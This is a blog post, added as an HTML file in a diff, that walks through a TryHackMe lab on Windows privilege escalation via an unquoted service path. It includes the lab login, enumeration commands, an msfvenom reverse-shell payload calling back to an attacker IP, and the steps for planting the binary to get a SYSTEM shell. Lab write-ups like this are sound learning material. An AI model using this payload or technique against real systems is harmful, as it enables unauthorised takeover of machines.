@@ -1,0 +1,241 @@
+
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Quotient | Mitul Kumar</title>
+  <meta name="description" content="Room about exploiting Unquoted Path vulnerability.">
+  <meta name="author" content="Mitul Kumar">
+  <meta name="theme-color" content="#0c100e">
+  <meta property="og:title" content="Quotient | Mitul Kumar">
+  <meta property="og:description" content="Room about exploiting Unquoted Path vulnerability.">
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://bl4ck574r.github.io/posts/Quotient/">
+  <meta property="article:published_time" content="2022-09-26T00:00:00+05:30">
+  <link rel="canonical" href="https://bl4ck574r.github.io/posts/Quotient/">
+  <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;450;500;600;650;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/styles.css">
+</head>
+<body class="article-page" id="top">
+  <a class="skip-link" href="#content">Skip to article</a>
+  <div class="terminal-bar">
+    <div class="terminal-bar-inner">
+      <span class="window-dots" aria-hidden="true"><i></i><i></i><i></i></span>
+      <a class="terminal-title" href="/" aria-label="Mitul Kumar portfolio">mitul<span class="muted">@</span>portfolio<span class="terminal-path">: ~</span></a>
+      <nav class="site-nav" aria-label="Main navigation">
+        <a href="/">Portfolio</a>
+        <a href="/blog/" aria-current="true">Blog</a>
+      </nav>
+    </div>
+  </div>
+
+  <main class="article-shell" id="content">
+    <a class="article-back" href="/blog/"><span aria-hidden="true">←</span> All posts</a>
+    <article aria-labelledby="article-title">
+      <header class="article-header">
+        <p class="shell-prompt" aria-hidden="true"><span>~/blog</span> $ cat Quotient.md</p>
+        <h1 id="article-title">Quotient</h1>
+        <div class="article-meta">
+          <span>Mitul Kumar</span>
+          <time datetime="2022-09-26T00:00:00+05:30">26 September 2022</time>
+        </div>
+        
+        <ul class="tags" aria-label="Topics">
+          <li>Windows</li><li>TryHackMe</li>
+        </ul>
+        
+        
+      </header>
+
+      <div class="post-content">
+        <p>Room about exploiting <em>Unquoted Path</em> vulnerability.</p>
+
+<p>We were provided with the username and the password to login:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="n">sage:</span><span class="w"> </span><span class="nx">gr33ntHEphgK2</span><span class="o">&amp;</span><span class="nx">V</span><span class="w">
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Using <em>xfreerdp</em>, we can get RDP session on the box.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>xfreerdp /u:sage /p:&lt;pass&gt; /v:&lt;target_ip&gt;
+</pre></td></tr></tbody></table></code></pre></div></div>
+<h3 id="basic-enumeration">Basic Enumeration</h3>
+<p>First thing first, we’ll look at all the users on the box.</p>
+
+<p><img src="https://user-images.githubusercontent.com/43528306/192245942-def599b8-f0ee-4421-bdca-1bca94e3a913.png" alt="image" /></p>
+
+<p>We only have two accounts, Administrator and sage. Next, we’ll look at the permission our user have:</p>
+
+<p><img src="https://user-images.githubusercontent.com/43528306/183398152-3e155ec4-59da-47fb-bee7-5c97a5c73f9e.png" alt="image" /></p>
+
+<p>Our user have shutdown rights. Enumerating more about our user</p>
+
+<p><img src="https://user-images.githubusercontent.com/43528306/183398380-af33888a-56ef-44d0-ac75-f5f3bfdcd12e.png" alt="image" /></p>
+
+<p>Looking for some non-default files on the box, we found:</p>
+
+<p><img src="https://user-images.githubusercontent.com/94787830/192247296-1f7d4dcc-0e42-43b7-bd85-57c161e69158.png" alt="image" /></p>
+
+<p>Both folder name contained empty spaces, this remind of <em>Unqouted Service path</em>. We can enumerate using either <em>powerup</em> or manully.</p>
+
+<h3 id="manual">Manual</h3>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre></td><td class="rouge-code"><pre><span class="n">C:\Users\Sage</span><span class="err">&gt;</span><span class="nx">wmic</span><span class="w"> </span><span class="nx">service</span><span class="w"> </span><span class="nx">get</span><span class="w"> </span><span class="nx">name</span><span class="p">,</span><span class="nx">pathname</span><span class="p">,</span><span class="nx">displayname</span><span class="p">,</span><span class="nx">startmode</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="nx">/i</span><span class="w"> </span><span class="nx">auto</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="nx">/i</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="s2">"C:\Windows\\"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="nx">/i</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="s2">"""
+Developmenet Service                                                                Development Service                       C:\Program Files\Development Files\Devservice Files\Service.exe                    Auto
+
+C:\Users\Sage&gt;sc qc "</span><span class="nx">Development</span><span class="w"> </span><span class="nx">Service</span><span class="s2">"
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: Development Service
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Program Files\Development Files\Devservice Files\Service.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : Developmenet Service
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+<h3 id="using-powerupps1">Using Powerup.ps1</h3>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Sage\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">get-unquotedservice</span><span class="w">
+
+
+</span><span class="n">ServiceName</span><span class="w">    </span><span class="p">:</span><span class="w"> </span><span class="nx">Development</span><span class="w"> </span><span class="nx">Service</span><span class="w">
+</span><span class="n">Path</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">C:\Program</span><span class="w"> </span><span class="nx">Files\Development</span><span class="w"> </span><span class="nx">Files\Devservice</span><span class="w"> </span><span class="nx">Files\Service.exe</span><span class="w">
+</span><span class="n">ModifiablePath</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">@{</span><span class="nx">ModifiablePath</span><span class="o">=</span><span class="nx">C</span><span class="err">:\</span><span class="p">;</span><span class="w"> </span><span class="nx">IdentityReference</span><span class="o">=</span><span class="nx">BUILTIN</span><span class="err">\</span><span class="nx">Users</span><span class="p">;</span><span class="w"> </span><span class="nx">Permissions</span><span class="o">=</span><span class="nx">AppendData</span><span class="err">/</span><span class="nx">AddSubdirectory</span><span class="p">}</span><span class="w">
+</span><span class="n">StartName</span><span class="w">      </span><span class="p">:</span><span class="w"> </span><span class="nx">LocalSystem</span><span class="w">
+</span><span class="n">AbuseFunction</span><span class="w">  </span><span class="p">:</span><span class="w"> </span><span class="nx">Write-ServiceBinary</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'Development Service'</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">HijackPath</span><span class="err">&gt;</span><span class="w">
+</span><span class="n">CanRestart</span><span class="w">     </span><span class="p">:</span><span class="w"> </span><span class="nx">False</span><span class="w">
+</span><span class="n">Name</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">Development</span><span class="w"> </span><span class="nx">Service</span><span class="w">
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>From both methods, we found the BinaryPath was not in qoutes. To exploit this vulnerability, next thing we need is a writable directory. To enumerate all the directories in path to find which one has write access,we can use <strong><em>icacls</em></strong>.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre></td><td class="rouge-code"><pre>C:<span class="se">\P</span>rogram Files&gt;icacls <span class="s2">"Development Files"</span>
+Development Files BUILTIN<span class="se">\U</span>sers:<span class="o">(</span>W<span class="o">)</span>
+                  NT SERVICE<span class="se">\T</span>rustedInstaller:<span class="o">(</span>I<span class="o">)(</span>F<span class="o">)</span>
+                  NT SERVICE<span class="se">\T</span>rustedInstaller:<span class="o">(</span>I<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>F<span class="o">)</span>
+                  NT AUTHORITY<span class="se">\S</span>YSTEM:<span class="o">(</span>I<span class="o">)(</span>F<span class="o">)</span>
+                  NT AUTHORITY<span class="se">\S</span>YSTEM:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>F<span class="o">)</span>
+                  BUILTIN<span class="se">\A</span>dministrators:<span class="o">(</span>I<span class="o">)(</span>F<span class="o">)</span>
+                  BUILTIN<span class="se">\A</span>dministrators:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>F<span class="o">)</span>
+                  BUILTIN<span class="se">\U</span>sers:<span class="o">(</span>I<span class="o">)(</span>RX<span class="o">)</span>
+                  BUILTIN<span class="se">\U</span>sers:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>GR,GE<span class="o">)</span>
+                  CREATOR OWNER:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>F<span class="o">)</span>
+                  APPLICATION PACKAGE AUTHORITY<span class="se">\A</span>LL APPLICATION PACKAGES:<span class="o">(</span>I<span class="o">)(</span>RX<span class="o">)</span>
+                  APPLICATION PACKAGE AUTHORITY<span class="se">\A</span>LL APPLICATION PACKAGES:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>GR,GE<span class="o">)</span>
+                  APPLICATION PACKAGE AUTHORITY<span class="se">\A</span>LL RESTRICTED APPLICATION PACKAGES:<span class="o">(</span>I<span class="o">)(</span>RX<span class="o">)</span>
+                  APPLICATION PACKAGE AUTHORITY<span class="se">\A</span>LL RESTRICTED APPLICATION PACKAGES:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>GR,GE<span class="o">)</span>
+
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h2 id="exploitation">Exploitation</h2>
+<p>Create a malicious binary using msfvenom or any other tool.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>IP <span class="nv">lport</span><span class="o">=</span>9991 <span class="nt">-f</span> exe <span class="o">&gt;</span> s.exe
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Transger the binary to target machine and place it in the folder to which we have write access and rename our malicious exe, according to path.</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Sage\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">dir</span><span class="w"> </span><span class="s1">'C:\Program Files\Development Files\'</span><span class="w">
+
+
+    </span><span class="n">Directory:</span><span class="w"> </span><span class="nx">C:\Program</span><span class="w"> </span><span class="nx">Files\Development</span><span class="w"> </span><span class="nx">Files</span><span class="w">
+
+
+</span><span class="n">Mode</span><span class="w">                </span><span class="nx">LastWriteTime</span><span class="w">         </span><span class="nx">Length</span><span class="w"> </span><span class="nx">Name</span><span class="w">
+</span><span class="o">----</span><span class="w">                </span><span class="o">-------------</span><span class="w">         </span><span class="o">------</span><span class="w"> </span><span class="o">----</span><span class="w">
+</span><span class="n">d-----</span><span class="w">         </span><span class="nx">3/7/2022</span><span class="w">   </span><span class="nx">3:03</span><span class="w"> </span><span class="nx">AM</span><span class="w">                </span><span class="nx">Devservice</span><span class="w"> </span><span class="nx">Files</span><span class="w">
+</span><span class="nt">-a</span><span class="o">----</span><span class="w">         </span><span class="mi">8</span><span class="n">/8/2022</span><span class="w">  </span><span class="nx">11:17</span><span class="w"> </span><span class="nx">AM</span><span class="w">          </span><span class="nx">73802</span><span class="w"> </span><span class="nx">Devservice.exe</span><span class="w">
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+<p>Here, we can try to restart the service using <code class="language-plaintext highlighter-rouge">net start &lt;service_name&gt;</code> but we dont have the privs to do so. As service is an autorun service, we can restart the system and setup a listener on our attacker box to catch the shell</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami                                                          
+<span class="nb">whoami
+</span>nt authority<span class="se">\s</span>ystem                     
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h2 id="references">References</h2>
+<ul>
+  <li>https://vk9-sec.com/privilege-escalation-unquoted-service-path-windows/</li>
+  <li>https://www.ired.team/offensive-security/privilege-escalation/unquoted-service-paths</li>
+</ul>
+
+      </div>
+    </article>
+
+    
+    <nav class="article-pagination" aria-label="More articles">
+      
+      <a href="/posts/VULNET-Node/" rel="prev">
+        <span>← Older post</span>
+        <strong>Vulnet Node</strong>
+      </a>
+      
+      
+    </nav>
+    
+
+    <footer class="article-footer">
+      <a href="/blog/">← All posts</a>
+      <span>© 2026 Mitul Kumar</span>
+      <a class="back-to-top" href="#top">Back to top ↑</a>
+    </footer>
+  </main>
+</body>
+</html>
